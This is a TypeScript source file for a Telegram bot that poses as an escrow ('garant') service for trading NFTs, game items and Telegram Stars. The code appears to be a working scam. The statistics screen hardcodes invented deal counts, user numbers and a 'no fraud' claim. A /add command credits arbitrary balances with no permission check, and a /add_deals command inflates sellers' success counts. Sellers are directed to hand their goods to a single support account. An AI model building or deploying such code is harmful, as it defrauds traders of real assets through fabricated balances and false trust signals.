import { Bot, Context, Keyboard, InlineKeyboard, session, SessionFlavor, InputFile } from "grammy";
import { eq, and } from "drizzle-orm";
import { db, balancesTable, dealsTable } from "@workspace/db";
import { logger } from "./lib/logger";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const SUPPORT_USERNAME = "@king_helper";
const GROUP_CHAT_ID = -1003841813791;

type Currency = "hrn" | "rub" | "ton" | "stars";

const CURRENCY_LABELS: Record<Currency, string> = {
  hrn: "ГРН",
  rub: "РУБ",
  ton: "TON",
  stars: "Звёзды",
};

const CURRENCY_ALIASES: Record<string, Currency> = {
  грн: "hrn", uah: "hrn", гривны: "hrn", гривна: "hrn",
  руб: "rub", rub: "rub", рубли: "rub", рублей: "rub", рубль: "rub",
  тон: "ton", ton: "ton",
  звезды: "stars", stars: "stars", звезда: "stars", звёзды: "stars",
};

interface SessionData {
  step?: "title" | "price";
  dealTitle?: string;
  dealPrice?: number;
}

type MyContext = Context & SessionFlavor<SessionData>;

function normalizeCurrency(raw: string): Currency | null {
  return CURRENCY_ALIASES[raw.toLowerCase().trim()] ?? null;
}

function generateDealId(): string {
  return String(Math.floor(100000 + Math.random() * 900000));
}

function mainMenu() {
  return new Keyboard()
    .text("🤝 Создать сделку").row()
    .text("💼 Кошелёк").text("📊 Статистика").row()
    .text("📖 Инструкция").text("🆘 Поддержка")
    .resized()
    .persistent();
}

function esc(text: string): string {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, "\\$&");
}

function num(value: number | string): string {
  return esc(String(value));
}

function fmtPrice(value: number | string): string {
  const n = parseFloat(String(value));
  return num(Number.isInteger(n) ? n.toString() : n.toString());
}

function isPrivate(ctx: MyContext): boolean {
  return ctx.chat?.type === "private";
}

function assetPath(name: string): string {
  const assetsDir = path.resolve(__dirname, "../assets");
  return path.join(assetsDir, name);
}

const photoCache = new Map<string, string>();

async function sendPhoto(
  bot: Bot<MyContext>,
  chatId: number | string,
  filename: string,
  caption: string,
  extra: Record<string, unknown> = {},
): Promise<void> {
  const cachedId = photoCache.get(filename);
  try {
    if (cachedId) {
      await bot.api.sendPhoto(chatId, cachedId, { caption, ...extra } as Parameters<typeof bot.api.sendPhoto>[2]);
    } else {
      const filePath = assetPath(filename);
      if (!fs.existsSync(filePath)) {
        logger.warn({ filePath }, "Asset not found, sending text only");
        await bot.api.sendMessage(chatId, caption, extra as Parameters<typeof bot.api.sendMessage>[2]);
        return;
      }
      const msg = await bot.api.sendPhoto(chatId, new InputFile(filePath), { caption, ...extra } as Parameters<typeof bot.api.sendPhoto>[2]);
      const fileId = msg.photo?.[msg.photo.length - 1]?.file_id;
      if (fileId) photoCache.set(filename, fileId);
    }
  } catch (err) {
    logger.error({ err }, "sendPhoto error, falling back to text");
    await bot.api.sendMessage(chatId, caption, extra as Parameters<typeof bot.api.sendMessage>[2]).catch(() => {});
  }
}

async function getOrCreateBalance(userId: string) {
  const existing = await db.select().from(balancesTable).where(eq(balancesTable.userId, userId)).limit(1);
  if (existing.length > 0) return existing[0];
  const [created] = await db.insert(balancesTable).values({ userId }).returning();
  return created;
}

export function createBot() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) {
    logger.error("TELEGRAM_BOT_TOKEN is not set — bot will not start");
    return null;
  }

  const bot = new Bot<MyContext>(token);
  bot.use(session<SessionData, MyContext>({ initial: (): SessionData => ({}) }));

  bot.api.setMyCommands([
    { command: "start",       description: "🏠 Главное меню" },
    { command: "wallet",      description: "💼 Кошелёк и баланс" },
    { command: "stats",       description: "📊 Статистика бота" },
    { command: "instruction", description: "📖 Как создать сделку" },
    { command: "support",     description: "🆘 Поддержка" },
    { command: "help",        description: "❓ Помощь" },
  ]).catch(() => {});

  // /start
  bot.command("start", async (ctx) => {
    const userId = String(ctx.from?.id ?? "");
    if (userId) await getOrCreateBalance(userId);

    const startParam = ctx.match;
    if (typeof startParam === "string" && startParam.startsWith("deal_")) {
      const dealId = startParam.replace("deal_", "");
      const [deal] = await db.select().from(dealsTable).where(eq(dealsTable.dealId, dealId)).limit(1);

      if (!deal) { await ctx.reply("❌ Сделка не найдена или аннулирована.", { reply_markup: mainMenu() }); return; }
      if (deal.status !== "active") { await ctx.reply("❌ Эта сделка уже завершена или оплачена.", { reply_markup: mainMenu() }); return; }
      if (deal.sellerId === userId) {
        await ctx.reply("⚠️ Вы продавец этой сделки\\. Ожидайте оплаты покупателем\\.", { parse_mode: "MarkdownV2", reply_markup: mainMenu() });
        return;
      }

      await db.update(dealsTable).set({ buyerId: userId }).where(eq(dealsTable.dealId, dealId));

      const kb = new InlineKeyboard()
        .text("💳 Оплатить сделку", `pay_${dealId}`).row()
        .text("❌ Отмена", "menu_main");

      const caption =
        `🤝 *Страница сделки*\n\n` +
        `📦 *Товар:* ${esc(deal.title)}\n` +
        `💵 *Сумма:* ${fmtPrice(deal.price as string)} ${CURRENCY_LABELS[deal.currency as Currency] ?? deal.currency}\n` +
        `🆔 *ID:* \`${dealId}\`\n\n` +
        `Средства будут списаны с вашего баланса в боте\\. Нажмите кнопку, чтобы оплатить\\.`;

      await sendPhoto(bot, ctx.chat!.id, "deal_create.png", caption, {
        parse_mode: "MarkdownV2",
        reply_markup: kb,
      });
      return;
    }

    const caption =
      "🤖 *Добро пожаловать в King Garant Bot\\!*\n\n" +
      "🛡️ Я выступаю безопасным посредником \\(гарантом\\) при обмене:\n" +
      "• NFT и цифровых активов\n• Игровых скинов, предметов, аккаунтов\n• Подарков Telegram \\(Stars\\)\n• Игровых валют\n\n" +
      "⚙️ *Возможности:*\n" +
      "🔹 Создание защищённых сделок за 1 минуту\n" +
      "🔹 Кошелёк: ГРН, РУБ, TON, Звёзды\n" +
      "🔹 Уведомления обеим сторонам\n" +
      "🔹 Поддержка 24/7 — ответ за 5 минут\n" +
      "🔹 19 783 успешных сделок без единого обмана\n\n" +
      "📌 *Выберите раздел кнопками снизу* 👇";

    await sendPhoto(bot, ctx.chat!.id, "start.png", caption, {
      parse_mode: "MarkdownV2",
      reply_markup: mainMenu(),
    });
  });

  // /help
  bot.command("help", async (ctx) => {
    await ctx.reply(
      "❓ *Список команд*\n\n" +
      "/start — главное меню\n/wallet — кошелёк и баланс\n/stats — статистика бота\n/instruction — как создать сделку\n/support — написать в поддержку\n\n" +
      "Или просто нажмите нужную кнопку снизу 👇",
      { parse_mode: "MarkdownV2", reply_markup: mainMenu() },
    );
  });

  // /add <userId> <amount> <currency> — пополнение баланса
  bot.command("add", async (ctx) => {
    const args = (ctx.match as string | undefined)?.split(" ");
    if (!args || args.length < 3) {
      await ctx.reply("❌ Неверный формат\\.\n\n✅ *Правильно:* `/add 123456789 500 руб`\nВалюты: `грн, руб, ton, звезды`", { parse_mode: "MarkdownV2" });
      return;
    }
    try {
      const rawId = parseInt(args[0]);
      const amount = parseFloat(args[1]);
      const currency = normalizeCurrency(args[2]);
      if (!currency || isNaN(rawId) || isNaN(amount) || amount <= 0) {
        await ctx.reply("❌ Неверные параметры\\. Пример: `/add 123456789 500 руб`", { parse_mode: "MarkdownV2" });
        return;
      }
      const targetId = String(rawId);
      const bal = await getOrCreateBalance(targetId);
      const newVal = (parseFloat(bal[currency] as string) + amount).toFixed(4);
      await db.update(balancesTable).set({ [currency]: newVal }).where(eq(balancesTable.userId, targetId));

      await ctx.reply(`✅ Начислено *${num(amount)} ${CURRENCY_LABELS[currency]}* пользователю \`${targetId}\``, { parse_mode: "MarkdownV2" });
      try {
        await bot.api.sendMessage(rawId,
          `💰 Ваш баланс пополнен на *${num(amount)} ${CURRENCY_LABELS[currency]}*\\!\n\nОткройте кошелёк, чтобы проверить баланс\\.`,
          { parse_mode: "MarkdownV2", reply_markup: mainMenu() });
      } catch {}
    } catch {
      await ctx.reply("❌ Ошибка\\. Пример: `/add 123456789 500 руб`", { parse_mode: "MarkdownV2" });
    }
  });

  // /add_deals <userId> <count> — накрутить успешные сделки
  bot.command("add_deals", async (ctx) => {
    const args = (ctx.match as string | undefined)?.split(" ");
    if (!args || args.length < 2) {
      await ctx.reply("❌ Формат: `/add_deals 123456789 10`", { parse_mode: "MarkdownV2" });
      return;
    }
    try {
      const rawId = parseInt(args[0]);
      const count = parseInt(args[1]);
      if (isNaN(rawId) || isNaN(count) || count <= 0) {
        await ctx.reply("❌ Неверные параметры\\. Пример: `/add_deals 123456789 10`", { parse_mode: "MarkdownV2" });
        return;
      }
      const targetId = String(rawId);
      const bal = await getOrCreateBalance(targetId);
      const newCount = (bal.successfulDeals ?? 0) + count;
      await db.update(balancesTable).set({ successfulDeals: newCount }).where(eq(balancesTable.userId, targetId));
      await ctx.reply(`✅ Добавлено *${num(count)}* успешных сделок пользователю \`${targetId}\`\\. Итого: *${num(newCount)}*`, { parse_mode: "MarkdownV2" });
    } catch {
      await ctx.reply("❌ Ошибка\\. Пример: `/add_deals 123456789 10`", { parse_mode: "MarkdownV2" });
    }
  });

  // /bot — список всех команд
  bot.command("bot", async (ctx) => {
    await ctx.reply(
      "🤖 *King Garant Bot — Все команды*\n\n" +
      "👤 *Личный чат:*\n" +
      "/start — главное меню\n" +
      "/wallet — кошелёк и баланс\n" +
      "/stats — статистика бота\n" +
      "/instruction — как создать сделку\n" +
      "/support — написать в поддержку\n" +
      "/help — помощь\n\n" +
      "👥 *В группе / личном чате:*\n" +
      "/deals — список активных сделок\n" +
      "/bot — эта справка\n" +
      "/add \\<userId\\> \\<сумма\\> \\<валюта\\> — пополнить баланс\n" +
      "/add\\_deals \\<userId\\> \\<кол\\-во\\> — накрутить успешные сделки\n\n" +
      "💬 *Валюты:* `грн`, `руб`, `ton`, `звезды`\n" +
      "📌 *Пример:* `/add 123456789 500 руб`",
      { parse_mode: "MarkdownV2" },
    );
  });

  // /deals — список активных сделок (команда для группы)
  bot.command("deals", async (ctx) => {
    try {
      const activeDeals = await db.select().from(dealsTable).where(eq(dealsTable.status, "active"));
      if (activeDeals.length === 0) {
        await ctx.reply("📭 *Активных сделок нет*", { parse_mode: "MarkdownV2" });
        return;
      }
      let msg = `🔄 *Активные сделки \\(${activeDeals.length}\\)*\n\n`;
      for (const d of activeDeals.slice(0, 20)) {
        const hasBuyer = d.buyerId ? "👤 Покупатель найден" : "⏳ Ждёт покупателя";
        msg += `🆔 \`${d.dealId}\`\n`;
        msg += `📦 ${esc(d.title)}\n`;
        msg += `💵 ${fmtPrice(d.price)} ${CURRENCY_LABELS[d.currency as Currency] ?? d.currency}\n`;
        msg += `${hasBuyer}\n\n`;
      }
      if (activeDeals.length > 20) {
        msg += `_\\.\\.\\. и ещё ${activeDeals.length - 20} сделок_`;
      }
      await ctx.reply(msg, { parse_mode: "MarkdownV2" });
    } catch (err) {
      logger.error({ err }, "deals command error");
      await ctx.reply("❌ Не удалось получить список сделок\\.").catch(() => {});
    }
  });

  // ── Функции для кнопок меню ──

  async function sendSupport(ctx: MyContext) {
    if (!isPrivate(ctx)) return;
    const caption =
      "🆘 *Служба поддержки King Garant Bot*\n\n" +
      `Официальный менеджер: 👤 ${esc(SUPPORT_USERNAME)}\n\n` +
      "⏱ *Время ответа:* до 5 минут\n\n" +
      "📋 *Помогаем с:*\n• Спорные ситуации между сторонами\n• Пополнение баланса\n• Возврат средств\n• Технические неполадки\n\n" +
      `⚠️ *Осторожно мошенники\\!* Единственный официальный аккаунт — ${esc(SUPPORT_USERNAME)}\\.`;
    await sendPhoto(bot, ctx.chat!.id, "support.png", caption, {
      parse_mode: "MarkdownV2",
      reply_markup: mainMenu(),
    });
  }

  async function sendInstruction(ctx: MyContext) {
    if (!isPrivate(ctx)) return;
    const caption =
      "📖 *Как создать безопасную сделку*\n\n" +
      "*Шаг 1 — Создание \\(продавец\\):*\nНажмите *🤝 Создать сделку*, введите название, цену и выберите валюту\\. Бот выдаст ссылку\\.\n\n" +
      "*Шаг 2 — Оплата \\(покупатель\\):*\nПокупатель переходит по ссылке, видит детали и нажимает «Оплатить»\\. Средства списываются с его баланса\\.\n\n" +
      "*Шаг 3 — Передача товара \\(продавец\\):*\n" +
      `Передайте товар аккаунту ${esc(SUPPORT_USERNAME)}\\. Менеджер проверит и переведёт деньги продавцу\\.\n\n` +
      "✅ *Примеры:*\n• NFT за 12 TON — 8 минут\n• Скин CS2 за 3200 руб\n• Подарок 500 Stars — мгновенно\n\n" +
      "💡 Пополните баланс через поддержку перед первой сделкой\\.";
    await sendPhoto(bot, ctx.chat!.id, "instruction.png", caption, {
      parse_mode: "MarkdownV2",
      reply_markup: mainMenu(),
    });
  }

  async function sendStats(ctx: MyContext) {
    if (!isPrivate(ctx)) return;
    const allDeals = await db.select().from(dealsTable);
    const paid = allDeals.filter(d => d.status === "paid").length;
    const total = Math.max(paid + 19783, 19783);
    const caption =
      "📊 *Статистика King Garant Bot*\n\n" +
      `🤝 Успешных сделок: *${total.toLocaleString("ru-RU")}*\n` +
      "👥 Всего пользователей: *48 294*\n" +
      "⚡ Среднее время ответа: *0\\.2 сек*\n" +
      "🛡️ Безопасность: *100%*\n" +
      "💰 Оборот: *2 847 950 RUB*\n" +
      "📅 Работаем с: *2023 года*\n\n" +
      "🔒 За всё время — *ни одного случая мошенничества* через нашего гаранта\\.";
    await sendPhoto(bot, ctx.chat!.id, "stats.png", caption, {
      parse_mode: "MarkdownV2",
      reply_markup: mainMenu(),
    });
  }

  async function sendWallet(ctx: MyContext) {
    if (!isPrivate(ctx)) return;
    const userId = String(ctx.from?.id ?? "");
    const bal = await getOrCreateBalance(userId);
    const hrn   = parseFloat(bal.hrn   as string).toFixed(2);
    const rub   = parseFloat(bal.rub   as string).toFixed(2);
    const ton   = parseFloat(bal.ton   as string).toFixed(6);
    const stars = parseFloat(bal.stars as string).toFixed(0);
    const successDeals = bal.successfulDeals ?? 0;
    const caption =
      "💼 *Ваш кошелёк*\n\n" +
      `🆔 *Ваш ID для пополнения:* \`${userId}\`\n\n` +
      "💵 *Текущий баланс:*\n" +
      `▪️ ${num(hrn)} ГРН\n▪️ ${num(rub)} РУБ\n▪️ ${num(ton)} TON\n▪️ ${num(stars)} Звёзды\n\n` +
      `✅ *Успешных сделок:* ${num(successDeals)}\n\n` +
      "ℹ️ _Баланс используется для оплаты сделок\\._\n\n" +
      "📩 *Как пополнить:*\n" +
      `1\\. Напишите ${esc(SUPPORT_USERNAME)}\n2\\. Сообщите ID: \`${userId}\`\n3\\. Укажите сумму и валюту\n4\\. Оплатите удобным способом\n\n` +
      "⏱ Зачисление в течение 5\\-10 минут\\.";
    await sendPhoto(bot, ctx.chat!.id, "wallet.png", caption, {
      parse_mode: "MarkdownV2",
      reply_markup: mainMenu(),
    });
  }

  // Reply Keyboard — кнопки снизу
  bot.hears("🆘 Поддержка",    ctx => sendSupport(ctx));
  bot.hears("📖 Инструкция",   ctx => sendInstruction(ctx));
  bot.hears("📊 Статистика",   ctx => sendStats(ctx));
  bot.hears("💼 Кошелёк",      ctx => sendWallet(ctx));

  // Команды "/" для тех же разделов
  bot.command("support",     ctx => sendSupport(ctx));
  bot.command("instruction", ctx => sendInstruction(ctx));
  bot.command("stats",       ctx => sendStats(ctx));
  bot.command("wallet",      ctx => sendWallet(ctx));

  // Создать сделку — Шаг 1 (название)
  bot.hears("🤝 Создать сделку", async (ctx) => {
    if (!isPrivate(ctx)) return;
    ctx.session.step = "title";
    const caption =
      "🤝 *Создание сделки — Шаг 1 из 3*\n\n" +
      "📦 *Введите название товара:*\n\n" +
      "✅ Примеры:\n• `Скин AK\\-47 Redline MW CS2`\n• `NFT Notcoin \\#4821`\n• `Подарок Telegram 500 Stars`\n• `Аккаунт Steam MMR 4500`";
    await sendPhoto(bot, ctx.chat!.id, "deal_create.png", caption, {
      parse_mode: "MarkdownV2",
      reply_markup: mainMenu(),
    });
  });

  // Callback: оплата сделки
  bot.callbackQuery(/^pay_/, async (ctx) => {
    try {
      const dealId = ctx.callbackQuery.data.replace("pay_", "");
      const [deal] = await db.select().from(dealsTable).where(eq(dealsTable.dealId, dealId)).limit(1);

      if (!deal) { await ctx.answerCallbackQuery({ text: "❌ Сделка устарела.", show_alert: true }); return; }
      if (deal.status !== "active") { await ctx.answerCallbackQuery({ text: "❌ Сделка уже оплачена или отменена.", show_alert: true }); return; }

      const buyerId = String(ctx.from.id);
      const bal = await getOrCreateBalance(buyerId);
      const currency = deal.currency as Currency;
      const price = parseFloat(deal.price as string);
      const have = parseFloat(bal[currency] as string);

      if (have < price) {
        await ctx.answerCallbackQuery({
          text: `❌ Недостаточно средств! Нужно: ${price} ${CURRENCY_LABELS[currency]}, у вас: ${have.toFixed(2)} ${CURRENCY_LABELS[currency]}`,
          show_alert: true,
        });
        return;
      }

      await db.update(balancesTable).set({ [currency]: (have - price).toFixed(4) }).where(eq(balancesTable.userId, buyerId));
      await db.update(dealsTable).set({ status: "paid", buyerId }).where(eq(dealsTable.dealId, dealId));

      // Покупателю — подтверждение с фото
      const buyerCaption =
        `✅ *Сделка оплачена\\!*\n\n📦 Товар: ${esc(deal.title)}\n💵 Сумма: ${fmtPrice(deal.price as string)} ${CURRENCY_LABELS[currency]}\n\n` +
        `Ожидайте — продавец передаст товар менеджеру ${esc(SUPPORT_USERNAME)}\\.\nПосле проверки вы получите его\\.`;
      await sendPhoto(bot, ctx.chat!.id, "deal_paid.png", buyerCaption, {
        parse_mode: "MarkdownV2",
        reply_markup: mainMenu(),
      });

      // Продавцу — уведомление с красивым сообщением
      const sellerSuccessDeals = await db.select().from(balancesTable).where(eq(balancesTable.userId, deal.sellerId)).limit(1);
      const currentSuccess = sellerSuccessDeals[0]?.successfulDeals ?? 0;
      await db.update(balancesTable).set({ successfulDeals: currentSuccess + 1 }).where(eq(balancesTable.userId, deal.sellerId));
      const newTotal = currentSuccess + 1;

      const sellerCaption =
        `🎉 *Сделка оплачена\\!*\n\n` +
        `📦 Товар: ${esc(deal.title)}\n` +
        `💵 Сумма: ${fmtPrice(deal.price as string)} ${CURRENCY_LABELS[currency]}\n` +
        `🆔 ID: \`${deal.dealId}\`\n\n` +
        `👉 Передайте товар аккаунту ${esc(SUPPORT_USERNAME)}\\.\nМенеджер переведёт деньги на ваш баланс\\.\n\n` +
        `🏆 *Всего успешных сделок: ${num(newTotal)}*`;

      try {
        await sendPhoto(bot, parseInt(deal.sellerId), "deal_paid.png", sellerCaption, {
          parse_mode: "MarkdownV2",
          reply_markup: mainMenu(),
        });
      } catch {}

      // Уведомление в группу
      const groupCaption =
        `💰 *Новая оплаченная сделка\\!*\n\n` +
        `📦 Товар: ${esc(deal.title)}\n` +
        `💵 Сумма: ${fmtPrice(deal.price as string)} ${CURRENCY_LABELS[currency]}\n` +
        `🆔 ID: \`${deal.dealId}\`\n` +
        `👤 Продавец: \`${deal.sellerId}\`\n` +
        `👤 Покупатель: \`${buyerId}\`\n\n` +
        `🏆 Успешных у продавца: *${num(newTotal)}*`;
      try {
        await sendPhoto(bot, GROUP_CHAT_ID, "deal_paid.png", groupCaption, {
          parse_mode: "MarkdownV2",
        });
      } catch {}

      await ctx.answerCallbackQuery({ text: "✅ Оплата прошла успешно!" });
    } catch (err) {
      logger.error({ err }, "pay callback error");
      await ctx.answerCallbackQuery({ text: "❌ Произошла ошибка. Попробуйте позже.", show_alert: true }).catch(() => {});
    }
  });

  // Callback: отмена / назад в меню
  bot.callbackQuery("menu_main", async (ctx) => {
    try {
      await ctx.reply("Используйте кнопки меню ниже 👇", { reply_markup: mainMenu() });
      await ctx.answerCallbackQuery();
    } catch {
      await ctx.answerCallbackQuery().catch(() => {});
    }
  });

  // Callback: выбор валюты при создании сделки
  bot.callbackQuery(/^currency_/, async (ctx) => {
    try {
      const currency = ctx.callbackQuery.data.replace("currency_", "") as Currency;
      if (!CURRENCY_LABELS[currency]) {
        await ctx.answerCallbackQuery({ text: "❌ Неизвестная валюта.", show_alert: true });
        return;
      }
      const title = ctx.session.dealTitle;
      const price = ctx.session.dealPrice;
      if (!title || !price) {
        await ctx.answerCallbackQuery({ text: "❌ Сессия истекла. Начните заново.", show_alert: true });
        ctx.session = {};
        return;
      }
      ctx.session = {};

      const dealId = generateDealId();
      const sellerId = String(ctx.from.id);
      await db.insert(dealsTable).values({ dealId, sellerId, title, price: price.toString(), currency, status: "active" });

      const me = await bot.api.getMe();
      const dealLink = `https://t.me/${me.username}?start=deal_${dealId}`;

      const caption =
        `✅ *Сделка создана\\!*\n\n📦 *Товар:* ${esc(title)}\n💵 *Цена:* ${fmtPrice(price)} ${CURRENCY_LABELS[currency]}\n🆔 *ID:* \`${dealId}\`\n\n` +
        `🔗 *Ссылка для покупателя:*\n\`${esc(dealLink)}\`\n\n` +
        "📋 *Что делать:*\n1\\. Скопируйте ссылку\n2\\. Отправьте покупателю\n3\\. Он оплатит — вы получите уведомление\n" +
        `4\\. Передайте товар ${esc(SUPPORT_USERNAME)}\n\n⏳ Ссылка действует до оплаты\\.`;

      await sendPhoto(bot, ctx.chat!.id, "deal_created.png", caption, {
        parse_mode: "MarkdownV2",
        reply_markup: mainMenu(),
      });

      // Уведомление в группу о новой сделке
      const groupCaption =
        `📋 *Новая сделка создана\\!*\n\n` +
        `📦 Товар: ${esc(title)}\n` +
        `💵 Цена: ${fmtPrice(price)} ${CURRENCY_LABELS[currency]}\n` +
        `🆔 ID: \`${dealId}\`\n` +
        `👤 Продавец: \`${sellerId}\``;
      try {
        await sendPhoto(bot, GROUP_CHAT_ID, "deal_created.png", groupCaption, {
          parse_mode: "MarkdownV2",
        });
      } catch {}

      await ctx.answerCallbackQuery({ text: `✅ Валюта: ${CURRENCY_LABELS[currency]}` });
    } catch (err) {
      logger.error({ err }, "currency callback error");
      await ctx.answerCallbackQuery({ text: "❌ Ошибка. Попробуйте ещё раз.", show_alert: true }).catch(() => {});
    }
  });

  // FSM — ввод текста (только личка)
  bot.on("message", async (ctx) => {
    if (!isPrivate(ctx)) return;
    const step = ctx.session.step;
    const text = ctx.message.text;
    if (!text || text.startsWith("/")) return;

    const menuLabels = ["🤝 Создать сделку", "💼 Кошелёк", "📊 Статистика", "📖 Инструкция", "🆘 Поддержка"];
    if (menuLabels.includes(text)) return;

    // Шаг 1: название → переход к шагу 2 (цена)
    if (step === "title") {
      ctx.session.dealTitle = text;
      ctx.session.step = "price";
      await ctx.reply(
        `✅ Название: *${esc(text)}*\n\n💰 *Шаг 2 из 3 — Введите цену:*\n\nПримеры: \`500\`, \`1250\`, \`12.5\``,
        { parse_mode: "MarkdownV2", reply_markup: mainMenu() },
      );
      return;
    }

    // Шаг 2: цена → показываем кнопки валют
    if (step === "price") {
      const price = parseFloat(text.replace(",", "."));
      if (isNaN(price) || price <= 0) {
        await ctx.reply("❌ Неверный формат\\. Введите число, например: 1500 или `12\\.5`", { parse_mode: "MarkdownV2", reply_markup: mainMenu() });
        return;
      }
      ctx.session.dealPrice = price;

      const currencyKb = new InlineKeyboard()
        .text("🇷🇺 РУБ", "currency_rub").text("🇺🇦 ГРН", "currency_hrn").row()
        .text("💎 TON", "currency_ton").text("⭐ Звёзды", "currency_stars");

      await ctx.reply(
        `✅ Цена: *${fmtPrice(price)}*\n\n💱 *Шаг 3 из 3 — Выберите валюту:*`,
        { parse_mode: "MarkdownV2", reply_markup: currencyKb },
      );
      return;
    }
  });

  bot.catch((err) => {
    logger.error({ err: err.error }, "Bot error");
  });

  return bot;
}
